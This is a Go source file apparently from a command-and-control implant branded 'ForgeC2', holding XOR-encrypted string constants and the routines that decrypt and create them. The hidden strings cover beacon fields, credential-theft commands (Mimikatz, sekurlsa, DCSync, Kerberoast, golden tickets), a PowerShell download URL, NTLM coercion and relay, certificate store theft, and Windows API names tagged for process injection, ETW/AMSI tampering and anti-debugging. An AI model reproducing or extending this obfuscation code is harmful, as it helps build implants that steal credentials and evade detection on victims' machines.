//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
)

// Obfuscated string constants (XOR-encrypted, decrypted at runtime)
const (
	SBeaconURI              = "732a988a97dc0ba1b87568f4df0d:XEvo47iqOo7aEAmXsGM="
	SBeaconMethod           = "01ddeaf3:UZK5pw=="
	SAgentVersion           = "fbfdbf49c8:ydOOZ/g="
	SUUID                   = "4a3f4982:P0og5g=="
	SHostname               = "9f0ec8475f51205d:92G7MzEwTTg="
	SUsername               = "13f951233f8d3408:Zoo0UVHsWW0="
	SIP                     = "76a8:H9g="
	SOS                     = "ad5b:wig="
	SArch                   = "f126f56c:kFSWBA=="
	SStatus                 = "7f00db4dc34f:DHS6ObY8"
	SLastSeen               = "6a700863bd7051bbb9:BhF7F+IDNN7X"
	SActiveWindow           = "4d2bad301a4a93ed7290336d83:LEjZWWwvzJob/lcC9A=="
	SIntegrity              = "856685fa38a6d22e29:7Ajxn1/Uu1pQ"
	SElevated               = "41c405112b9a362a:JKhgZ0ruU04="
	SResults                = "ba2cf22424524b:yEmBUUgmOA=="
	SEncoding               = "e7c1f252cb2f3db8:gq+RPa9GU98="
	STaskType               = "01020304:dXtzYQ=="
	SOutput                 = "d5c314ed8e:RM4PLA=="
	SFilename               = "0a5a12c3d1e307aa82cc:HnFMRzA4VSck"
	SMimikatz               = "4f21af15ad0c65a1:IkjCfMZtEds="
	SKerberoast             = "2c34b46ee64beb529e0a:R1HGDIM5hDPtfg=="
	SSekurlsa               = "523e31079e178fb2:IVtacux7/NM="
	SKerberos               = "ffa8e3201c166193:lM2RQnlkDuA="
	SLsadump                = "c4e86f81a95b0a:qJsO5dw2eg=="
	SLogonpasswords         = "b2f782efbf3cc8878707370f9b04:3pjlgNFMqfT0cFh9/3c="
	SHashdump               = "dad3845bc3caaaf7:srL3M6e/x4c="
	SDcsync                 = "cd2c8f5ee855:qU/8J4Y2"
	SInvokeMimikatz         = "0a1d20a2ecfbed087b743055bb3104:Q3NWzYeewEUSGVk+2kV+"
	SSekurlsaPth            = "85d806a8012940ad58980bc0b8:9r1t3XNFM8xionu00A=="
	SSekurlsaLogonpasswords = "8243808b0615fdba2de93a8475345a969f73a328c0c52f5e:8Sbr/nR5jtsX01brEls05v4A0F+vt0st"
	SKerberosPtt            = "3d6003eccdef38baabc5bc27d6:VgVxjqidV8mR/8xTog=="
	SLsadumpDcsync          = "45808ca6309fc1d0dd1b463d363aec:KfPtwkXysernfyVOT1SP"
	SLsadumpMinidump        = "25fab162b7921786e0e0d9bf5356b18bc7:SYnQBsL/Z7zajbDROjLE5rc="
	SSekurlsaMinidump       = "42b0192c7a49c507c2efc469b6f55c9cffe4:MdVyWQgltmb41akA2Jw46ZKU"
	SKerberosGolden         = "4682e680a9fc37aa00f92a785cc23894:LeeU4syOWNk6w00XMKZd+g=="
	SPSDownloadURL          = "65c7aa8169191ad47eb4d4b504040de73556fd1bb200efba5cc9f438347c704e792e2b34ca2fb3181d16e2aa197ac1b840863ddd5d134f1ed8cc5321ceba236e36aefd3bc7dae1f46cdc5e0dc1:DbPe8RojNfsM1aObY215j0A0iGjXcozVMr2RVkBSEyEUAW5ZukbBfU1kjcB8GbWXBettpC92YHO5vydEvJVQAUPcnl7ot46QGbA7fu4="
	SPowershellExe          = "e219a5e8b2b9bed6f16b611f58f8:knbSjcDK1rOdB096IJ0="
	SCmdExe                 = "12ccfeb1303c81:caGan1VE5A=="
	SBeaconTransport        = "4da4f6:OteF"
	SCoerceSpoolss          = "ec4c2b5c9ff5dc:nzxEM/OGrw=="
	SCoerceLsarpc           = "c9807a8ba4b0:pfMb+dTT"
	SCoerceNetdfs           = "f25fe9feea4a:nDqdmow5"
	SRelayNTLM              = "b1851feb8dba7beecd2f:3/FzhtLIHoKsVg=="

	// Certificate Store Theft
	SCrypt32   = "7A87A67095BD9A10F61C53:GfXfAOGOqD6ScD8="
	SCertStore = "1518FC3B461A60E64815DAF757:Vn2OTwlqBYgbYbWFMg=="
	SCertEnum  = "885FA37CF50F84280D5310ACAB679B173CBEFFC658855A0E10209A:yzrRCLBh8UVONmLYwgHydF3KmrUR6wl6f1L/"

	// Multi-C2 mode
	SC2Mode = "afeaf44263386975:yYudLgxODAc=" // "failover"

	// Agent banner
	SForgeC2 = "53d73755f69c1260d7:CJFYJ5H5UVKK" // "[ForgeC2]"

	// Default C2 URL fallback (used only when no config blob is injected)
	SC2DefaultURL = "48b37a32e5dd291af634488823fc2aacae9f43c43b:IMcOQt/yBivEA2a4DcwEnZSnc/wL" // "http://127.0.0.1:8080"

	// High-signal Windows API names (injection / AMSI / ETW / antidebug)
	SProcOpenP              = "9982a8d44238a5e7380264:1vLNuhJKyoRdcRc="                // "OpenProcess"
	SProcVAllocEx           = "6460c004f7f83ea20482dc277281:MgmycIKZUuNo7rNEN/k="     // "VirtualAllocEx"
	SProcWPMem       = "320d88d82ed5fa369c7727bd3e46ce7ecf65:ZX/hrEuFiFn/ElTOcyOjEb0c" // "WriteProcessMemory"
	SProcCRThread       = "3c0833a070fd04d9fd903cfc7e4bb8dff8dd:f3pWwQSYVryQ/0iZKiPKupm5" // "CreateRemoteThread"
	SProcVFreeEx            = "4cb7abf07b28329d7746614801:Gt7ZhA5JXtsFIwQNeQ=="       // "VirtualFreeEx"
	SProcVPEx         = "354c49392e33b31d99b8306a254dcde8:YyU7TVtS303r10QPRjmIkA==" // "VirtualProtectEx"
	SProcQUAPC             = "30780c39a4aee1907b39050b:YQ1pTMH7kvUJeFVI"             // "QueueUserAPC"
	SProcGModuleW         = "4b682c02ca64a9609e96238f96d45c62:DA1YT6UA3Az73kLh8rg5NQ==" // "GetModuleHandleW"
	SProcGProcAddr           = "50b3af2ef45efad675fb042643e7:F9bbfoYxmZcRn3ZDMJQ="     // "GetProcAddress"
	SProcVProtect           = "313ffa383ced2930ca39cb57a2c0:Z1aITEmMRWC4Vr8ywbQ="     // "VirtualProtect"
	SProcNtQIP = "aead3cd2a165b1fff41a100aad67de217f74fa1eaf464321ca:4Nltp8QXyLaafH94wAaqSBAaqmzAJSZSuQ==" // "NtQueryInformationProcess"
	SProcNtSIT   = "9c33234b2ef6defe8583d81ce8f1697e612b190ecee8:0kdwLlq/sJjq8bV9nJgGEDVDa2uvjA==" // "NtSetInformationThread"
	SProcNtC                  = "712e1b44fc1a71:P1pYKJNpFA=="                          // "NtClose"
	SProcGCThread         = "9518b44eef1490da25da25c8f00db5cd:0n3ADZpm4r9LrnGggmjUqQ==" // "GetCurrentThread"
	SProcGCTId       = "dd38a5ba8b4dad6a5fef0e51daf2a9283e4d:ml3R+f4/3w8xm1o5qJfITHcp" // "GetCurrentThreadId"
	SProcOThread               = "87382fe07f11c1cbfad5:yEhKjit5s66bsQ=="                // "OpenThread"
	SProcEtwFull        = "8ebad20b09080badf5be6afbec5b2b9681:y86lTn9tZdmizAOPiR1e+u0=" // "EtwEventWriteFull"
	SProcNtQSI = "b89c02863f8212ba036d33e68e209466de728c85031163bd:9uhT81rwa+l6HkeD42n6ALEA4eR3eAzT" // "NtQuerySystemInformation"
	SProcMitPolicy = "ff9c67ddd18c87b4adfbd4924732c5a2a0418ceec9c2b6ae6468:rPkTjaPj5NHeiJn7M1uiw9Qo44CZrdrHBxE=" // "SetProcessMitigationPolicy"
	SProcAddVEH = "a8ba46465c5a93766cd36de8e1e4f67c7003be39468eaacdeb287a:6d4iEDk55xketgmtmYeTDARq0VcO78Sph00I" // "AddVectoredExceptionHandler"
	SProcRemVEH = "7c983b79f7321fdfbea92a856d4af8f34099cc3991790222028eac11c291:Lv1WFoFXSbrd3UX3CC69iyP8vE34FmxqY+DIfafj" // "RemoveVectoredExceptionHandler"
)

//go:noinline
func mustDecrypt(obfuscated string) string {
	idx := -1
	for i := 0; i+1 <= len(obfuscated); i++ {
		if obfuscated[i] == ':' {
			idx = i
			break
		}
	}
	if idx < 0 {
		return ""
	}
	key, _ := hex.DecodeString(obfuscated[:idx])
	data, _ := base64.StdEncoding.DecodeString(obfuscated[idx+1:])
	if len(key) != len(data) {
		return ""
	}
	out := make([]byte, len(data))
	for i := range data {
		out[i] = data[i] ^ key[i]
	}
	return string(out)
}

//go:noinline
func s(obfuscated string) string {
	return mustDecrypt(obfuscated)
}

//go:noinline
func obfuscate(plaintext string) string {
	key := make([]byte, len(plaintext))
	rand.Read(key)
	encrypted := make([]byte, len(plaintext))
	for i := range plaintext {
		encrypted[i] = plaintext[i] ^ key[i]
	}
	return hex.EncodeToString(key) + ":" + base64.StdEncoding.EncodeToString(encrypted)
}
